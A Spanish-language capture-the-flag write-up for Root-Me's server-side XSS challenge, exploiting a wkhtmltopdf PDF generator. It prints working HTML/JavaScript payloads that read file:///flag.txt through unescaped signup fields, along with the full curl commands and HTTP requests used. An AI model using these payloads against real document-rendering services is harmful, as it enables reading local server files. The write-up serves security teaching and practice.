🎯 Writeup: XSS - Server Side (Root-Me CTF)
📋 Tabla de Contenidos

    Descripción del Reto

    Reconocimiento

    Identificación del Vector de Ataque

    Desarrollo del Exploit

    Ejecución del Ataque

    Flags y Resultados

    Análisis Técnico

    Mitigaciones

    Lecciones Aprendidas

📝 Descripción del Reto

    "¿Quién dijo que el XSS era sólo para el lado del cliente?"

Plataforma: Root-Me CTF - HackDay 2023
Categoría: Web-Server
Dificultad: Media (2% de resolución)
Puntos: 20
Objetivo: Obtener la flag del archivo /flag.txt
Contexto

El reto presenta una plataforma de emisión de certificados que genera PDFs con los datos del usuario. Los desarrolladores afirmaron haber "escapado todas las entradas de los usuarios", pero...
🔍 Reconocimiento
1. Análisis Inicial

Primero, identificamos los endpoints disponibles:
bash

# Escaneo básico
curl -v http://challenge01.root-me.org:59083/

Respuesta del servidor:
text

Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.2.25

2. Identificación de Funcionalidades

El sistema tiene:

    Página de registro (signup)

    Página de login

    Generación de PDF (/generate.php)

3. Análisis del Generador de PDF
bash

# Probando la generación de PDF
curl -X POST http://challenge01.root-me.org:59083/generate.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "text=test" \
  --output test.pdf

# Inspeccionando metadatos
pdfinfo test.pdf

Hallazgo clave: El PDF revela el motor de renderizado:
text

/Producer: wkhtmltopdf 0.12.5
/Title: Document
/Creator: wkhtmltopdf 0.12.5

4. Pruebas de Inyección

Probamos diferentes puntos de entrada:
bash

# Campo de texto (escapado correctamente)
curl -X POST ... -d "text=<h1>XSS</h1>"
# ✅ El HTML se muestra como texto literal

# Campos de registro (firstname, secondname)
curl -X POST ... -d "firstname=<h1>XSS</h1>&lastname=test"
# ❌ ¡EL HTML SE RENDERIZA EN EL PDF!

🎯 Identificación del Vector de Ataque
1. Punto Débil Encontrado

Los campos firstname y secondname del registro son vulnerables:
html

<!-- Primer nombre vulnerable -->
First Name: <h1>XSS_TEST</h1>

<!-- Segundo nombre vulnerable -->
Second Name: <iframe src='file:///flag.txt'>

2. Análisis de la Vulnerabilidad
text

USUARIO (POST) → SERVIDOR → BASE DE DATOS → LOGIN → GENERADOR PDF → PDF CONTAMINADO
     ↑                                                                   ↓
     └───────────────────── XSS Server-Side ──────────────────────────────┘

Flujo del ataque:

    El usuario introduce HTML malicioso en firstname/secondname

    El servidor NO ESCAPA el HTML

    Los datos se guardan en la base de datos

    Al generar el PDF, wkhtmltopdf renderiza el HTML

    El motor de renderizado ejecuta el JavaScript en el servidor

3. Reconocimiento de Tecnologías
bash

# Identificando el motor de renderizado
strings test.pdf | grep -i "producer"
# Output: /Producer (��wkhtmltopdf 0.12.5)

wkhtmltopdf es vulnerable a:

    ✅ XSS del lado del servidor

    ✅ SSRF (Server-Side Request Forgery)

    ✅ Lectura de archivos locales con file://

    ✅ Ejecución de JavaScript en el servidor

💣 Desarrollo del Exploit
1. Pruebas de Concepto
Payload 1: JavaScript Básico
html

<script>document.write('XSS_TEST')</script>

Payload 2: Lectura de Archivos (XMLHttpRequest)
html

<script>
var x = new XMLHttpRequest();
x.open('GET', 'file:///flag.txt', false);
x.send();
document.write('<pre>' + x.responseText + '</pre>');
</script>

Payload 3: Fetch API (Moderno)
html

<script>
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(t => document.body.innerHTML = t);
</script>

Payload 4: Iframe Injection (EL GANADOR 🏆)
html

<iframe 
  src='file:///flag.txt' 
  onload='document.write(this.contentDocument.body.innerHTML)'
></iframe>

2. Por qué funcionó el iframe
javascript

// El iframe carga el archivo local
<iframe src='file:///flag.txt' 
        onload='document.write(this.contentDocument.body.innerHTML)'>
</iframe>

// Cuando el iframe carga, el onload se ejecuta
// this.contentDocument.body.innerHTML contiene la flag
// document.write() la escribe en el PDF

🚀 Ejecución del Ataque
1. Registro con Payload Malicioso
http

POST /signup.php HTTP/1.1
Host: challenge01.root-me.org:59083
Content-Type: application/x-www-form-urlencoded

firstname=test&
secondname=<iframe src='file:///flag.txt' onload='document.write(this.contentDocument.body.innerHTML)'></iframe>&
username=attacker&
password=hacked

2. Inicio de Sesión
http

POST /login.php HTTP/1.1
Host: challenge01.root-me.org:59083
Content-Type: application/x-www-form-urlencoded

username=attacker&password=hacked

3. Generación del PDF Contaminado
http

POST /generate.php HTTP/1.1
Host: challenge01.root-me.org:59083
Cookie: PHPSESSID=VALID_SESSION

text=test

4. Extracción de la Flag
bash

# Descargar el PDF
curl -X POST http://challenge01.root-me.org:59083/generate.php \
  -H "Cookie: PHPSESSID=VALID_SESSION" \
  -d "text=test" \
  --output flag.pdf

# Extraer texto del PDF
pdftotext flag.pdf output.txt

# Ver la flag
cat output.txt

5. Resultado
text

┌─────────────────────────────────────────────────────┐
│                                                     │
│              🏁 FLAG ENCONTRADA 🏁                  │
│                                                     │
│               ************************              │
│                                                     │
│        ¡XSS del lado del servidor es mucho          │
│                 más divertido!                      │
│                                                     │
└─────────────────────────────────────────────────────┘

🔬 Análisis Técnico
1. Arquitectura de la Vulnerabilidad
text

┌─────────────────────────────────────────────────────────────┐
│                     SERVIDOR WEB                            │
│                                                             │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │   REGISTRO   │───▶│  BASE DATOS  │───▶│    LOGIN     │   │
│  │  (ENTRADA)   │    │  (ALMACENA)  │    │  (AUTENTICA) │   │
│  └──────────────┘    └──────────────┘    └──────────────┘   │
│         │                                       │           │
│         │                                       ▼           │
│         │                               ┌──────────────┐    │
│         └──────────────────────────────▶│  GENERADOR   │    │
│                                         │     PDF      │    │
│                                         └──────────────┘    │
│                                                │            │
│                                                ▼            │
│                                         ┌──────────────┐    │
│                                         │ wkhtmltopdf  │    │
│                                         │  RENDERIZA   │    │
│                                         └──────────────┘    │
│                                                │            │
│                                                ▼            │
│                                         ┌──────────────┐    │
│                                         │   /flag.txt  │    │
│                                         │   ¡LEÍDO!    │    │
│                                         └──────────────┘    │
└─────────────────────────────────────────────────────────────┘

2. Flujo de Ejecución del Payload
text

1. REGISTRO
   firstname: "test"
   secondname: "<iframe src='file:///flag.txt' ...>"
   
2. ALMACENAMIENTO
   El HTML se guarda literalmente en la BD
   
3. GENERACIÓN DEL PDF
   wkhtmltopdf interpreta el HTML del usuario
   
4. RENDERIZADO
   - Encuentra <iframe>
   - Intenta cargar file:///flag.txt
   - El sistema permite el protocolo file://
   - Ejecuta onload
   - Escribe el contenido en el PDF
   
5. RESULTADO
   El PDF contiene la flag en lugar del nombre

3. Por qué otras pruebas fallaron
Vector Probado	Resultado	Razón
Campo text	❌ Escapado	htmlspecialchars() aplicado
User-Agent	❌ Escapado	No se usa en el PDF
Cookie PHPSESSID	❌ Escapado	Valor de sesión no reflejado
Headers HTTP	❌ Escapado	No se reflejan en el PDF
firstname	✅ VULNERABLE	Sin escape en la generación del PDF
secondname	✅ VULNERABLE	Sin escape en la generación del PDF
